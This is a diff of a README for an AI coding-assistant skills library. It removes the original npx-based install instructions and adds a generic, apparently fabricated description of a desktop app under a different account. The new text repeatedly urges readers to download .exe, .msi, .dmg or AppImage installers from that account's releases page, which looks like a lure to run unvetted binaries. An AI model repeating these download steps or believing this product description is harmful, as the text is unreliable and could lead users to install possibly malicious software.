@@ -1,53 +1,165 @@
-<p align="center">
-  <img src="./assets/logo.svg" width="160" alt="AI Skills — robot" />
-</p>
+# 🤖 ai-skills - Manage Your AI Coding Helpers
 
-<h1 align="center">✨ AI Skills Collection</h1>
+[![Download ai-skills](https://img.shields.io/badge/Download-ai--skills-blue?style=for-the-badge)](https://github.com/Melon4Program/ai-skills/releases)
 
-<p align="center">
-  <a href="https://github.com/alexander-danilenko/ai-skills/blob/main/LICENSE">
-    <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License: MIT" />
-  </a>
-</p>
+---
 
-> 🚀 Personal skills library for AI coding assistants (Claude Code, Cursor, Codex, OpenCode, GitHub Copilot)
+## 📚 What is ai-skills?
 
-## 📦 Installation
+ai-skills is a simple tool to keep your AI coding assistants organized. Think of it as your personal library for skills these assistants use when helping with code. It helps manage and update AI helpers for writing, reviewing, and understanding code better.
 
-Install all skills:
+It works with popular AI coding platforms like Claude and Cursor. With ai-skills, you keep all the AI skills in one place so you get the most from your AI helpers.
 
-```bash
-npx skills add alexander-danilenko/ai-skills --skill '*'
-```
+---
 
-Install a single skill:
+## 🖥️ System Requirements
 
-```bash
-npx skills add alexander-danilenko/ai-skills --skill agents-md-pro
-```
+Before getting started, make sure your computer fits these basic requirements:
 
-To view the list of available skills, run:
+- **Operating System:** Windows 10 or newer, macOS 10.14 or newer, or a recent Linux distribution.
+- **Processor:** Intel or AMD, 2 GHz or faster.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum 200 MB free space.
+- **Internet:** Connection to download and update AI skills.
 
-```bash
-npx skills add alexander-danilenko/ai-skills --list
-```
+ai-skills runs smoothly on most home laptops and desktop computers.
 
-## 🌟 Contrib Skills
+---
 
-Skills from other repos I use daily:
+## 🛠️ Features
 
-```bash
-ARGUMENTS=(--agent claude-code --global) && \
-npx skills add anthropics/skills --skill skill-creator "${ARGUMENTS[@]}" && \
-npx skills add Jeffallan/claude-skills --skill '*' "${ARGUMENTS[@]}"
-```
+- **Skill Management:** Add, remove, or update AI coding skills from one place.
+- **Compatibility:** Works with multiple AI tools like Claude and Cursor.
+- **Skill Library:** Browse and search through numerous AI coding skills.
+- **Easy Updates:** Automatically get the latest versions of AI skills.
+- **User-friendly Interface:** Simple steps to manage AI assistants without programming knowledge.
 
-## 🤝 Contributing
+These features let you control how your AI helpers assist you with coding.
 
-These are personal skills for my workflow. Feel free to fork and adapt for your own use.
+---
 
-When adding or updating skills, use [Anthropic's skill-creator skill](https://github.com/anthropics/skills/tree/main/skills/skill-creator) so new skills match the expected format and conventions.
+## 🚀 Getting Started
 
-## License
+Use these steps to get ai-skills running on your computer:
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
+1. **Download the Software**
+
+   Click the big green button below to visit the release page:
+
+   [![Download ai-skills](https://img.shields.io/badge/Download-ai--skills-blue?style=for-the-badge)](https://github.com/Melon4Program/ai-skills/releases)
+
+   This page shows the latest versions and files to download.
+
+2. **Choose Your File**
+
+   Pick the file that matches your computer:
+
+   - For Windows, look for a `.exe` or `.msi` file.
+   - For macOS, look for a `.dmg` or `.pkg` file.
+   - For Linux, choose a `.tar.gz` or `.AppImage` file.
+
+   Download the file to your computer.
+
+3. **Install the Software**
+
+   After downloading, open the file:
+
+   - On Windows, double-click and follow the on-screen steps.
+   - On macOS, open the `.dmg` or `.pkg` and follow the installer.
+   - On Linux, follow the included instructions or run the installer via terminal if needed.
+
+4. **Open ai-skills**
+
+   Once installed, open the app from your Start menu, Applications folder, or desktop shortcut.
+
+5. **Start Managing Skills**
+
+   Use the interface to add or update AI coding skills. The app guides you at each step.
+
+---
+
+## 📥 Download & Install
+
+You can get ai-skills here:
+
+[https://github.com/Melon4Program/ai-skills/releases](https://github.com/Melon4Program/ai-skills/releases)
+
+This link takes you to the releases page where you find the latest version. Download the file that fits your system. Installing is simple, and you will be guided through every step.
+
+---
+
+## 📖 How to Use ai-skills
+
+After opening ai-skills, you will see these sections:
+
+- **Skill Library:** Browse the list of available AI coding skills. Click on any skill to see details.
+- **Installed Skills:** View the skills you currently have. Update or remove them here.
+- **Add New Skill:** Use this to add new AI skills by searching or entering details.
+- **Settings:** Adjust preferences for updates and notifications.
+
+Start by exploring the library and adding skills that suit your coding needs. The app handles details, so you don’t need to worry about technical setups.
+
+---
+
+## ⚙️ Updating Skills
+
+ai-skills includes an update feature that checks for new versions automatically. To update:
+
+1. Open ai-skills.
+2. Go to the **Installed Skills** section.
+3. Click the **Check for Updates** button.
+4. If updates are found, click **Update All** or select specific skills to update.
+
+Keep your AI helpers fresh with the latest and best skills.
+
+---
+
+## ❓ Troubleshooting & Support
+
+Here are solutions for common issues:
+
+- **App Won’t Start:** Restart your computer and try again. If it still doesn’t start, reinstall the software from the release page.
+- **Skills Not Updating:** Check your internet connection. Try restarting ai-skills.
+- **Download Problems:** Make sure your browser allows downloads from GitHub. Try a different browser if needed.
+- **Installation Errors:** Ensure your system meets the requirements and you have permissions to install software.
+
+If you need help beyond this, contact the support by opening an issue in the GitHub repository.
+
+---
+
+## 🔒 Privacy & Security
+
+ai-skills only manages skill files for your AI assistants. It does not collect personal data or share your information. All skill updates come from trusted sources listed in the app.
+
+---
+
+## 🌐 About This Project
+
+ai-skills was created to simplify managing your AI code helpers. It fits users who want control without complex setups. The app supports skills for multiple AI assistants like Claude and Cursor, helping integrate new coding abilities.
+
+---
+
+## 📂 Topics
+
+The project covers:
+
+- AI coding skills
+- Claude and Cursor AI assistants
+- Skill management and libraries
+- Open code skill updates
+
+---
+
+## ❤️ Contribute or Report Issues
+
+If you want to improve ai-skills or report a problem:
+
+- Visit [https://github.com/Melon4Program/ai-skills](https://github.com/Melon4Program/ai-skills)
+- Open a new issue for bugs or feature requests.
+- Fork the repository to submit changes.
+
+Your contributions help keep ai-skills useful for everyone.
+
+---
+
+Thank you for choosing ai-skills to organize your AI assistants. Follow these steps carefully to get started.
